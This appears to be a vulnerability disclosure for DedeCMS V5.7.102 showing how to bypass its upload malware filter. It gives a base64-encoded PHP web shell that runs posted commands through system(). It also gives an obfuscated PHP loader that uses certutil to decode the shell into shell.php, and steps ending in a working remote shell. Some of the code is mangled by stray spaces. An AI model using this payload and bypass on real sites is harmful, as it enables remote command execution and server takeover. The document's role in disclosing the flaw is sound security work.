from https://www.dedecms.com/download Download the latest version of DedeCMS V5.7.102 source code
From the code audit, we can see that in the file_ manage_ The file content is restricted in the control.php code

![image](https://user-images.githubusercontent.com/40231393/204222736-6bc9aa96-aaaf-49fe-b4ae-35306ab75513.png)

Any PHP feature will detect whether you have an execution function. Most methods are filtered. At this time, encryption obfuscation can be constructed to bypass.
First, build a test.txt

-----BEGIN CERTIFICATE-----

PD9waHAgQHN5c3RlbSgkX1BPU1RbJ2NtZCddKTsgPz4=

-----END CERTIFICATE-----


Second, build a test.php

<? php $x='sys';$ xx='tem';$ xxx=$x.$ xx;$ y='certutil -decode test. t';$ yy='xt shell.php';$ yyy=$y.$ yy;$ xxx($yyy) ?>

The upload blocker displays the DedeCMS prompt: There is malicious code in the currently uploaded file! By building the data package, we can find that our content is not intercepted

![image](https://user-images.githubusercontent.com/40231393/204222815-a2c1ba1c-4082-4348-a43b-22192c2e5adb.png)
![image](https://user-images.githubusercontent.com/40231393/204222831-3d66de34-3516-480f-a327-30ccc104dc50.png)

Access the test.php execution code, and you can see that the base64 code we built has been decoded, and the shell.php has been generated

![image](https://user-images.githubusercontent.com/40231393/204222857-1d47a53a-61d5-412b-a32f-05ca32671e78.png)
![image](https://user-images.githubusercontent.com/40231393/204222868-1fda4647-9c1e-4b5b-ae1c-98f151c6c7f5.png)

Access the execution command, and execute the getshell successfully

![image](https://user-images.githubusercontent.com/40231393/204222895-2d8b8f6a-4a50-4443-8159-1bd513ea4cfa.png)
